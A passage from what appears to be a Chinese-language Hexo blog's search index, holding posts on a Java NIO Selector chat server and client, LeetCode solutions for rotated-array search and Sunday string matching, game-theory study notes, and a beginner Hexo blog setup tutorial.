class="comment">//从当前位置上添加，put之后，position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">int</span> index, <span class="keyword">byte</span> b)</span></span>;<span class="comment">//从绝对位置上put</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="关于Selector"><a href="#关于Selector" class="headerlink" title="关于Selector"></a>关于Selector</h4><blockquote><p>Selector类是一个抽象类，常用的方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Selector</span> <span class="keyword">implements</span> <span class="title">Closeable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Selector <span class="title">open</span><span class="params">()</span></span>;<span class="comment">//得到一个选择器对象</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">long</span> timeout)</span></span>;<span class="comment">//监控所有注册的通道，当其中有10操作可以进行时，将对应的										//SelectionKey加入到内部集合中并返回，参数用来设置超时时间</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Set&lt;SelectionKey&gt; <span class="title">selectedKeys</span><span class="params">()</span></span>;<span class="comment">// 从内部集合中得到所有的SelectionKey</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NIO编程流程"><a href="#NIO编程流程" class="headerlink" title="NIO编程流程"></a>NIO编程流程</h3><div class="note success"><ol><li>当客户端需要连接时，通过<code>ServerSocketChannel</code>得到<code>SocketChannel</code>对象。</li><li>将该<code>SocketChannel</code>对象注册到<code>Selector</code>上，使用<code>register(Selector sel)</code>方法，在一个<code>selector</code>上可以注册多个<code>SocketChannel</code>对象。（<strong>将监听服务通道和监听到的对象通道均注册到Selector</strong>）</li><li>注册后返回一个<code>SelectionKey</code>，会和该<code>Selector</code>关联（集合）。</li><li><code>Selector</code>进行监听<code>select</code>方法，返回有事件发生的通道个数。</li><li>进一步得到各个<code>SelectionKey</code>。</li><li>通过使用<code>SelectionKey</code>的<code>channel()</code>方法反向获取<code>SocketChannel</code>。</li><li>通过得到的<code>channel</code>完成业务处理。</li></ol></div><hr><h3 id="NIO代码实践—简单的多用户聊天服务场景"><a href="#NIO代码实践—简单的多用户聊天服务场景" class="headerlink" title="NIO代码实践—简单的多用户聊天服务场景"></a>NIO代码实践—简单的多用户聊天服务场景</h3><h4 id="服务端：NIOServer"><a href="#服务端：NIOServer" class="headerlink" title="服务端：NIOServer"></a>服务端：NIOServer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建ServerSocketChannel</span></span><br><span class="line">        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到一个selector对象</span></span><br><span class="line">        Selector selector = Selector.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绑定一个端口6666，在服务器端监听</span></span><br><span class="line">        serverSocketChannel.socket().bind(<span class="keyword">new</span> InetSocketAddress(<span class="number">6666</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置为非阻塞</span></span><br><span class="line">        serverSocketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把serverSocketChannel注册到selector，关心的实践为OP_ACCEPT</span></span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环等待客户端连接</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//等待1秒，如果没有事件发生，继续</span></span><br><span class="line">            <span class="keyword">if</span>(selector.select(<span class="number">1000</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//没有事件发生</span></span><br><span class="line">                System.out.println(<span class="string">"服务器等待了1秒，无连接"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果返回的&gt;0,就获取到相关的SelectionKey集合</span></span><br><span class="line">            <span class="comment">//selectionKeys是关注事件的集合</span></span><br><span class="line">            <span class="comment">//通过selectionKeys反向获取通道</span></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            <span class="comment">//遍历selectionKeys，使用迭代器！！</span></span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line">            <span class="keyword">while</span> (keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="comment">//获取到SelectionKey</span></span><br><span class="line">                SelectionKey key = keyIterator.next();</span><br><span class="line">                <span class="comment">//根据key对应通道发生的事件做相应的处理</span></span><br><span class="line">                <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                    <span class="comment">//有新的客户端连接</span></span><br><span class="line">                    <span class="comment">//给该客户端生成一个SocketChannel</span></span><br><span class="line">                    <span class="comment">//注意：这里已经知道实际的类型，所以下面的accept()方法</span></span><br><span class="line">                    <span class="comment">//并不会阻塞</span></span><br><span class="line">                    SocketChannel socketChannel = serverSocketChannel.accept();</span><br><span class="line">                    System.out.println(<span class="string">"客户端连接成功，生成了一个通道 "</span>+</span><br><span class="line">                            socketChannel.hashCode());</span><br><span class="line">                    <span class="comment">//将通道设置为非阻塞</span></span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="comment">//将当前的socketChannel注册到selector，关注事件为</span></span><br><span class="line">                    <span class="comment">//OP_READ(从通道读入到缓冲区)，同时给该socketChannel关联一个buffer</span></span><br><span class="line">                    socketChannel.register(selector,SelectionKey.OP_READ,</span><br><span class="line">                            ByteBuffer.allocate(<span class="number">1024</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">//发生一个OP_READ事件</span></span><br><span class="line">                    <span class="comment">//通过key,反向获取对应的通道</span></span><br><span class="line">                    <span class="comment">//SelectableChannel向下转型为SocketChannel</span></span><br><span class="line">                    SocketChannel channel = (SocketChannel) key.channel();</span><br><span class="line">                    <span class="comment">//获取到该通道关联的buffer</span></span><br><span class="line">                    ByteBuffer buffer = (ByteBuffer)key.attachment();</span><br><span class="line">                    channel.read(buffer);</span><br><span class="line">                    System.out.println(<span class="string">"From 客户端："</span>+<span class="keyword">new</span> String(buffer.array()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//手动从集合中移除SelectionKey，防止重复操作</span></span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端：NIOClient"><a href="#客户端：NIOClient" class="headerlink" title="客户端：NIOClient"></a>客户端：NIOClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//得到一个网络通道</span></span><br><span class="line">        SocketChannel socketChannel = SocketChannel.open();</span><br><span class="line">        <span class="comment">//设置非阻塞模式</span></span><br><span class="line">        socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">        <span class="comment">//提供服务器端的IP和端口</span></span><br><span class="line">        InetSocketAddress inetSocketAddress = <span class="keyword">new</span> InetSocketAddress(<span class="string">"127.0.0.1"</span>, <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">//连接服务器</span></span><br><span class="line">        <span class="comment">//其中socketChannel.connect判断远程连接是否建立成功</span></span><br><span class="line">        <span class="comment">//socketChannel.finishConnect()判断channel's socket是否连接</span></span><br><span class="line">        <span class="keyword">if</span>(!socketChannel.connect(inetSocketAddress))&#123;</span><br><span class="line">            <span class="keyword">while</span> (!socketChannel.finishConnect())&#123;</span><br><span class="line">                System.out.println(<span class="string">"因为连接需要时间，客户端不会阻塞，可以继续工作"</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果连接成功则发生数据</span></span><br><span class="line">        String str = <span class="string">"hello ,小yi"</span>;</span><br><span class="line">        <span class="comment">//wrap()包裹的含义，返回一个与str大小相等的buffer</span></span><br><span class="line">        <span class="comment">//等价于ByteBuffer buffer = ByteBuffer.allocate(str.getBytes().length);</span></span><br><span class="line">        ByteBuffer buffer = ByteBuffer.wrap(str.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发生数据，将buffer写入通道</span></span><br><span class="line">        socketChannel.write(buffer);</span><br><span class="line">        <span class="comment">//客户端停在此处</span></span><br><span class="line">        System.in.read();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note warning"><p>启动<code>NIOServer</code>和多个<code>NIOClient</code>，可以看到打印的<code>hashcode</code>值不相等，说明一个<code>Selector</code>同时管理着多个连接。</p></div>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>NIO</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title>33. 搜索旋转排序数组</title>
    <url>/2020/03/10/33-%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note primary"><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。( 例如，数组 <code>[0,1,2,4,5,6,7]</code> 可能变为 <code>[4,5,6,7,0,1,2]</code> )。搜索一个给定的目标值，如果数组中存在这个目标值，则返回它的索引，否则返回 <code>-1</code> 。你可以假设数组中不存在重复的元素。你的算法时间复杂度必须是 <code>O(log n)</code> 级别。</p></div><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="note success"><p>该题有两个关键点：</p><ol><li>如何理解旋转：题中的旋转是在一个<strong>点</strong>旋转，所以对于数组如<code>[1,2,3]</code>，不存在类似这样的旋转结果：<code>[3,2,1]</code></li><li>要求时间复杂度为 <code>O(logn)</code>，很容易想到应该用二分法，但关键在于如何讨论出所有可能情况。</li></ol></div><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二分查找:分三种情况，左边有序，右边有序，左右都有序</span></span><br><span class="line">        <span class="comment">//使用位运算代替乘除法（常用的优化办法）</span></span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = len-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            mid = (left+right)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左右都有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&gt;=nums[right])&#123;<span class="comment">//左边有序，右边无序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&lt;nums[mid]&amp;&amp;target&lt;nums[left])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&gt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左边无序，右边有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&lt;nums[mid])</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&gt;nums[mid]&amp;&amp;target&gt;nums[right])</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    left  = mid + <span class="number">1</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><div class="note warning"><p>不得不说位运算是个神器，时间消耗只有传统乘除法的<code>1/4</code>，同时位运算也是实现乘除法的一种办法。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>28. 实现 strStr()--简单难度？</title>
    <url>/2020/03/07/28-%E5%AE%9E%E7%8E%B0-strStr-%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%EF%BC%9F/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note default"><p>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回 -1。</p></div><a id="more"></a><h3 id="Sunday算法"><a href="#Sunday算法" class="headerlink" title="Sunday算法"></a>Sunday算法</h3><div class="note info"><p>这是一道字符串匹配的常见题型，常规算法两个for循环解决；但是，除了KMP这种不太容易手撕的算法外，Sunday算法可以说是一种非常容易理解和实现的算法。</p></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sunday算法Java实现</span></span><br><span class="line">    <span class="keyword">int</span> MAXSIZE = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> moveLength[] = <span class="keyword">new</span> <span class="keyword">int</span>[MAXSIZE];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">        getMoveLength(needle);</span><br><span class="line">        <span class="keyword">int</span> len1 = haystack.length();</span><br><span class="line">        <span class="keyword">int</span> len2 = needle.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(needle==<span class="keyword">null</span>||<span class="string">""</span>.equals(needle))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len1) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(  ;j &lt; len2 &amp;&amp; i + j &lt; len1 &amp;&amp; haystack.charAt(i + j) == needle.charAt(j); ++ j);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(j &gt;= len2) <span class="keyword">return</span> i;</span><br><span class="line">            <span class="keyword">if</span>(i + len2 &gt;= len1)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            i+=moveLength[haystack.charAt(i + len2)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getMoveLength</span><span class="params">(String needle)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//关键！，根据256种字符类型而不是needle串中的字符确定移动步数</span></span><br><span class="line">        <span class="keyword">int</span> len = needle.length();   </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; MAXSIZE; ++ i)</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">            moveLength[i] = len + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;len ; ++ i)&#123;</span><br><span class="line">            moveLength[needle.charAt(i)] = len - i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><div class="note primary"><p>从前往后匹配，每次匹配过程的末尾的下一位去检查该字符是否存在于模式串中：</p><ol><li><p>若存在于模式串中，则返回<code>i</code>的移动步数<code>move=</code>模式串长度<code>-</code> 所在字符的位置最后一个出现位置</p></li><li><p>若不存在，则<code>move</code>=模式串长度<code>+</code>1</p></li></ol><p>算法本身其实很容易理解，主要在实现查询办法时需要注意，每次去模式串中查找某个字符效率会比较低下，且算法设计很冗余，较好的办法可以如上述代码，<strong>设计一个大小为<code>256</code>的数组</strong>，用于存储每个字符的移动步数，这样检索时不会有重复检索问题，效率会高不少。</p></div><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><div class="note warning"><p>缺点很明显，主要有两点：</p><ol><li><p>即已经匹配的部分字符串完全没有利用，被浪费。</p></li><li><p><code>Sunday</code>算法的效率受到匹配串和模式串的影响。</p><p>主串：baaaabaaaabaaaabaaaa</p><p>模式串：aaaaa</p><p>这个模式串使得move[a]的值为1，即每次匹配失败时，只让模式串向后移动一位再进行匹配。这样就让Sunday算法的时间复杂度飙升到了<code>O(m*n)</code>，即字符串匹配常规情况。</p></li></ol><p>此外，不得不吐槽的是，<code>Leetcode</code>官方认为这道题时简单题，给出的数据完全对Sunday算法不利，反而常规算法这道题效率更高。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>博弈论学习（一）</title>
    <url>/2020/03/03/%E5%8D%9A%E5%BC%88%E8%AE%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h4 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h4><div class="note success"><ul><li>不要选择劣势策略。</li><li>理性的选择导致非最优结果。</li><li>想获得某些事物之前必定要试图做/了解他。</li><li>站在别人的立场上分析他们会怎么做。</li><li>耶鲁大学的学生很自私（2333）。</li></ul></div>]]></content>
      <categories>
        <category>课程学习</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo + GitPages + PicGo搭建你的第一个静态个人博客教程（踩坑实践）</title>
    <url>/2020/03/01/hexo-gitpages-picgo%E6%90%AD%E5%BB%BA%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><div class="note default"><p>心血来潮，都二十多岁的人了还没有一个自己的博客，确实说不过去，最近因为疫情原因也确实有了有史以来最长的一个寒假，除了学习<code>+</code>玩耍，我发现我越来越想要留下些属于自己的印记，或是记录，或是分享。不管怎么样，这是真正动笔的第一篇<code>blog</code>，一个全新的开始，加油吧！</p></div><a id="more"></a><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="为什么是Hexo？"><a href="#为什么是Hexo？" class="headerlink" title="为什么是Hexo？"></a>为什么是<code>Hexo</code>？</h4><div class="note primary"><p>相信对博客或多或少了解的同学都知道<code>WordPress</code>，一款强大的也是普及率最高的个人博客平台，如今几乎各大云平台都提供一键部署功能，可以说在资金到位的情况下（服务器+域名的长期维护费用），<code>WordPress</code>很适合对blog刚刚入门的小白，是的，它简单、成熟且易用。</p><p>但作为学生党，本着能省则省外加多折腾的原则，拥有一款永久免费的blog当然是最吼的。那么<code>Hexo</code>便是这样一款博客框架。<span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3Mv">Hexo<i class="fa fa-external-link-alt"></i></span>是一个快速、简洁且高效的博客框架。<code>Hexo</code> 使用 <span class="exturl" data-url="aHR0cDovL2RhcmluZ2ZpcmViYWxsLm5ldC9wcm9qZWN0cy9tYXJrZG93bi8=">Markdown<i class="fa fa-external-link-alt"></i></span>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></div><h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><div class="note info"><p>可能你现在并不知道什么叫做<strong><u>静态网页</u></strong>，不用着急，本教程完全带你从零开始搭建你的blog，你只需一步步根据教程往下走，直到你走完全程，你自然会明白这一切。</p><ul><li>使用平台：Windows。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL25vZGVqcy5vcmcv">Node.js<i class="fa fa-external-link-alt"></i></span>，点击选择符合你电脑的<strong>直装版本</strong>即可。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL2dpdC1zY20uY29tLw==">Git<i class="fa fa-external-link-alt"></i></span>，根据官方疯狂下一步即可。</li></ul></div><h4 id="使用Git-Bash安装并初始化Hexo"><a href="#使用Git-Bash安装并初始化Hexo" class="headerlink" title="使用Git Bash安装并初始化Hexo"></a>使用Git Bash安装并初始化Hexo</h4><div class="note info"><p>安装好Git之后，它会创建Git Bash和Git GUI两个程序，分别是终端和可视化版本，我们这里只需要用到Git Bash这个程序。</p><ul><li><p>第一步给你的博客建立一个本地仓库，推荐这样创建文件夹：<code>D/workspaces/</code></p></li><li><p>进入到<code>workspaces</code>文件夹，鼠标点击右键，选择Git Bash Here，弹出一个黑色命令框，那么一切就从这里开始了。</p></li><li><p>输入命令：<code>node -v</code>。顾名思义，这个命令用于检测刚刚你是否装好了node。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302195054.png" alt=""></p><p>如图所示，我这里已经装好了v12.16.1版本</p></li><li><p>接下来安装Hexo，输入命令：<code>npm install -g hexo-cli</code>。这里可能提示你没有安装npm命令，通常是因为你的node没有正确安装，输入<code>yum install -y nodejs</code>重新安装即可。</p></li><li><p>查看版本：输入<code>hexo -v</code>，见到如下场景，说明安装成功。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302201627.png" alt=""></p></li><li><p>初始化hexo：输入命令<code>hexo init myblog</code>。该命令会在当前目录下创建并初始化hexo的工作目录名为<code>myblog</code>。</p></li><li><p>首先使用命令<code>cd myblog</code>进入到该文件夹，然后输入命令<code>npm install</code>安装相关依赖。</p></li></ul></div><h4 id="构建你的本地Hexo博客"><a href="#构建你的本地Hexo博客" class="headerlink" title="构建你的本地Hexo博客"></a>构建你的本地Hexo博客</h4><div class="note success"><p>完成hexo初始化后，我们不妨尝试先看看我们的博客到底是怎么样子，继续在上面的GitBash窗口输入以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g&#x2F;&#x2F;构建hexo博客文件</span><br><span class="line">hexo s&#x2F;&#x2F;启动hexo本地服务器</span><br></pre></td></tr></table></figure><p>如此，在浏览器输入<code>localhost:4000</code>，如果看到hexo的博客首页，说明你的博客已经可以在本地运行了。</p></div>]]></content>
      <tags>
        <tag>实用教程</tag>
      </tags>
  </entry>
</search>
